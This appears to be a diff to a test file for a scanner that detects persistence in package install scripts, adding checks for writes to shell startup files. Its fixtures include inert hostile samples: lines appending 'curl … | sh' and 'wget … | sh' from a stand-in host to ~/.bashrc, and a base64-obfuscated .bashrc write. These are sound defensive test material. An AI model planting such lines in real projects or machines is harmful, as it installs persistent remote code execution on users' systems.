@@ -2,8 +2,9 @@
 // python/tests/scanner/test_persistence_services.py. The install-script test
 // fails on a systemd unit written or enabled, a launchd agent written or
 // loaded, a cron job installed, a Windows Run key written, a scheduled task
-// created, the Startup folder written and an XDG autostart entry; import-time
-// code never gets these. tests/architecture/test_snapshot_signs.py holds
+// created, the Startup folder written, an XDG autostart entry and (0.1.9) a
+// command that downloads or runs code written to a shell's startup file;
+// import-time code never gets these. tests/architecture/test_snapshot_signs.py holds
 // the engine to its recorded outputs on a random corpus (the npm package
 // runs the native engine). Inert text only: nothing is executed.
 
@@ -76,12 +77,33 @@ test("the Startup folder and desktop autostart", () => {
     "fs.readdirSync(path.join(home, '.config', 'autostart'))"], []);
 });
 
+test("a shell's startup file, when the command written there downloads or runs code (0.1.9)", () => {
+  each(["const fs = require('fs'), os = require('os'), path = require('path');\n"
+    + "fs.appendFileSync(path.join(os.homedir(), '.bashrc'), 'curl -s https://x.invalid/i | sh\\n');\n",
+    "const LINE = 'nohup node ~/.cache/x/agent.js &';\nfs.appendFileSync(os.homedir() + '/.bashrc', LINE + '\\n');\n",
+    "echo 'wget -qO- https://x.invalid/i | sh' >> ~/.bashrc"], ["adds a command to a shell's startup file (.bashrc)"]);
+  each(["const rc = path.join(os.homedir(), '.zshrc');\n"
+    + "const output = spawnSync(cli, ['autocomplete', 'script', 'zsh']).stdout;\n"
+    + "fs.appendFileSync(rc, `\\n# CLI Autocomplete\\n${output}\\n`);\n",
+    "echo 'export PATH=\"$HOME/.tool/bin:$PATH\"' >> ~/.bashrc",
+    "const s = fs.readFileSync(path.join(os.homedir(), '.bashrc'), 'utf8');\n",
+    "document.querySelector('.profile').remove();\nfs.writeFileSync(a, 'curl x | sh');\n"], []);
+  // a startup file named only in strings the script decodes: whatever it writes there (alinet)
+  const hidden = "const fs = require('fs'), os = require('os'), path = require('path');\n"
+    + "const rc = Buffer.from('LmJhc2hyYw==', 'base64').toString();\n"
+    + "const b = path.join(os.homedir(), rc);\nfs.writeFileSync(b, 'alinet\\n' + fs.readFileSync(b, 'utf8'));\n";
+  assert.deepEqual(installScriptRisk(hidden), ["adds a command to a shell's startup file (.bashrc) (in strings it decodes as it runs)"]);
+  assert.deepEqual(importTimeRisk(hidden, "js"), [[], null]);
+});
+
 test("install time only, and hostile texts finish fast", () => {
   assert.deepEqual(installScriptRisk(UNIT_WRITER), ["installs a systemd service"]);
   assert.deepEqual(importTimeRisk(UNIT_WRITER, "js"), [[], null]);
   for (const text of ["systemctl -a".repeat(200_000), "| crontab ".repeat(200_000), "CurrentVersion\\Run ".repeat(200_000),
     "reg " + " ".repeat(1_000_000), "'systemd', 'user', ".repeat(100_000) + "fs.writeFileSync(", "LaunchAgents x\n".repeat(200_000),
-    "(".repeat(1_000_000), "\n" + " ".repeat(1_000_000), "/etc/cron.d/x ".repeat(100_000) + "\n"]) {
+    "(".repeat(1_000_000), "\n" + " ".repeat(1_000_000), "/etc/cron.d/x ".repeat(100_000) + "\n",
+    "'.bashrc' " + "appendFileSync(a".repeat(100_000), "'.zshrc' " + Array.from({ length: 50_000 }, (_, i) => `write(n${i}) `).join(""),
+    "echo x >> ~/.bashrc ".repeat(200_000), "~/.profile\n".repeat(200_000)]) {
     const start = performance.now();
     serviceReasons(text);
     assert.ok(performance.now() - start < 5000, text.slice(0, 30));
